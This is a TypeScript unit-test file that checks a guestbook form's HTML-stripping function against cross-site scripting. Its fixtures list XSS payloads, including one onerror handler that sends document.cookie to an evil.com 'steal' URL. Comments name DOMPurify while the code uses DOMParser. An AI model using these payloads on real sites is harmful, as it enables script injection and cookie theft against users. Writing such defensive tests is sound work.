import { describe, expect, it } from "bun:test";
import { JSDOM } from "jsdom";

// Setup jsdom to provide DOMParser and Node
const dom = new JSDOM("<!DOCTYPE html><html><body></body></html>");
(
  global as typeof globalThis & {
    DOMParser?: typeof DOMParser;
    Node?: typeof Node;
  }
).DOMParser = dom.window.DOMParser;
(
  global as typeof globalThis & {
    DOMParser?: typeof DOMParser;
    Node?: typeof Node;
  }
).Node = dom.window.Node;

describe("Guestbook XSS Protection", () => {
  // Replicate the stripHtml function from GuestbookForm for testing
  const stripHtml = (html: string) => {
    // Use a DOMParser-based approach which is safer than regex
    // This strips all HTML tags while preserving text content
    if (typeof window === "undefined") {
      // SSR fallback: basic regex strip (shouldn't normally be reached)
      return html.replace(/<[^>]*>/g, "");
    }

    try {
      const doc = new DOMParser().parseFromString(html, "text/html");
      // Recursively extract text content from all nodes
      const extractText = (node: Node): string => {
        if (node.nodeType === Node.TEXT_NODE) {
          return node.textContent || "";
        }
        return Array.from(node.childNodes).map(extractText).join("");
      };
      return extractText(doc.body);
    } catch {
      // If parsing fails, fall back to regex strip
      return html.replace(/<[^>]*>/g, "");
    }
  };

  describe("XSS Attack Prevention", () => {
    it("should strip script tags", () => {
      const attacks = [
        '<script>alert("XSS")</script>',
        '<script src="https://evil.com/malware.js"></script>',
        "Hello<script>alert(1)</script>World",
      ];

      for (const attack of attacks) {
        const result = stripHtml(attack);
        expect(result).not.toContain("<script");
        expect(result).not.toContain("</script>");
      }
    });

    it("should strip img tags with onerror handlers", () => {
      const attacks = [
        '<img src=x onerror=alert("XSS")>',
        '<img src="x" onerror="fetch(\'https://evil.com/steal?cookie=\' + document.cookie)">',
        "<img src=x:alert(alt) onerror=eval(src) alt=x>",
      ];

      for (const attack of attacks) {
        const result = stripHtml(attack);
        expect(result).not.toContain("<img");
        expect(result).not.toContain("onerror");
      }
    });

    it("should strip svg with malicious content", () => {
      const attacks = [
        '<svg onload=alert("XSS")>',
        "<svg><script>alert(1)</script></svg>",
        "<svg/onload=alert(document.domain)>",
      ];

      for (const attack of attacks) {
        const result = stripHtml(attack);
        expect(result).not.toContain("<svg");
        expect(result).not.toContain("<script");
      }
    });

    it("should strip iframe tags", () => {
      const attacks = [
        '<iframe src="https://evil.com"></iframe>',
        '<iframe srcdoc="<script>alert(1)</script>">',
      ];

      for (const attack of attacks) {
        const result = stripHtml(attack);
        expect(result).not.toContain("<iframe");
      }
    });

    it("should strip object and embed tags", () => {
      const attacks = [
        '<object data="https://evil.com/malware.swf"></object>',
        '<embed src="https://evil.com/malware.swf">',
      ];

      for (const attack of attacks) {
        const result = stripHtml(attack);
        expect(result).not.toContain("<object");
        expect(result).not.toContain("<embed");
      }
    });

    it("should strip javascript: protocols", () => {
      const attacks = [
        "<a href=\"javascript:alert('XSS')\">Click me</a>",
        '<a href="javascript:void(0)" onclick="alert(1)">Link</a>',
        "<div style=\"background:url(javascript:alert('XSS'))\">",
      ];

      for (const attack of attacks) {
        const result = stripHtml(attack);
        expect(result.toLowerCase()).not.toContain("javascript:");
      }
    });

    it("should strip event handlers", () => {
      const attacks = [
        '<div onclick=alert("XSS")>Click me</div>',
        "<div onmouseover=alert(1)>Hover me</div>",
        '<div onload=fetch("https://evil.com/steal")>',
        '<body onload=alert("XSS")>',
      ];

      for (const attack of attacks) {
        const result = stripHtml(attack);
        expect(result).not.toMatch(
          /on(click|mouseover|load|error|focus|blur)=/i,
        );
      }
    });

    it("should strip style tags with expression()", () => {
      const attacks = [
        "<style>body{background:url(javascript:alert(1))}</style>",
        "<div style=\"width: expression(alert('XSS'))\">",
      ];

      for (const attack of attacks) {
        const result = stripHtml(attack);
        expect(result).not.toContain("<style");
        expect(result).not.toContain("expression(");
      }
    });

    it("should strip data: URIs with script content", () => {
      const attacks = [
        '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>',
        '<iframe src="data:text/html,<script>alert(1)</script>">',
      ];

      for (const attack of attacks) {
        const result = stripHtml(attack);
        expect(result).not.toContain("<script");
      }
    });

    it("should handle encoded XSS payloads", () => {
      const attacks = [
        "%3Cscript%3Ealert('XSS')%3C%2Fscript%3E",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
      ];

      for (const attack of attacks) {
        const result = stripHtml(attack);
        // DOMPurify should handle HTML entities
        if (attack.includes("&#")) {
          expect(result).not.toContain("<script");
        }
      }
    });
  });

  describe("Legitimate Content Preservation", () => {
    it("should preserve plain text", () => {
      const messages = [
        "Hello, this is a test message!",
        "Great portfolio! Love the design.",
        "Nice work on the projects section.",
      ];

      for (const message of messages) {
        const result = stripHtml(message);
        expect(result).toBe(message);
      }
    });

    it("should preserve text with special characters", () => {
      const messages = [
        "I love &lt;3 your design!", // < is encoded to &lt; by DOMPurify
        "The tech stack: Next.js + TypeScript is awesome",
        "Contact me at username (at) domain (dot) com",
        "Price is $50 &amp; shipping is $10", // & is encoded to &amp;
      ];

      for (const message of messages) {
        const result = stripHtml(message);
        expect(result).toBe(message);
      }
    });

    it("should preserve emojis", () => {
      const messages = ["Great work! 🎉🚀", "Love it ❤️🔥", "Thanks! 👍✨"];

      for (const message of messages) {
        const result = stripHtml(message);
        expect(result).toBe(message);
      }
    });

    it("should preserve multiline content", () => {
      const message = `Line 1
Line 2
Line 3`;

      const result = stripHtml(message);
      expect(result).toBe(message);
    });
  });

  describe("Edge Cases", () => {
    it("should handle empty strings", () => {
      expect(stripHtml("")).toBe("");
    });

    it("should handle whitespace-only strings", () => {
      expect(stripHtml("   \n\t   ")).toBe("   \n\t   ");
    });

    it("should handle null bytes", () => {
      const attack = "<script\x00>alert(1)</script>";
      const result = stripHtml(attack);
      expect(result).not.toContain("<script");
    });

    it("should handle mixed legitimate and malicious content", () => {
      const messages = [
        'Great site! <script>alert("XSS")</script> Keep it up!',
        "<img src=x onerror=alert(1)>Hello World<img src=y onerror=alert(2)>",
        "Nice<script>evil()</script>work!",
      ];

      for (const message of messages) {
        const result = stripHtml(message);
        expect(result).not.toContain("<script");
        expect(result).not.toContain("<img");
        // Should preserve surrounding text
        expect(result.length).toBeGreaterThan(0);
      }
    });
  });

  describe("DOMPurify Configuration", () => {
    it("should have no allowed tags (text-only)", () => {
      const result = stripHtml("<b>bold</b> <i>italic</i> plain");
      expect(result).not.toContain("<b>");
      expect(result).not.toContain("<i>");
      expect(result).toBe("bold italic plain");
    });

    it("should have no allowed attributes", () => {
      const result = stripHtml(
        '<div class="test" id="myid" data-foo="bar">text</div>',
      );
      expect(result).not.toContain("class=");
      expect(result).not.toContain("id=");
      expect(result).not.toContain("data-foo=");
      expect(result).toBe("text");
    });
  });
});
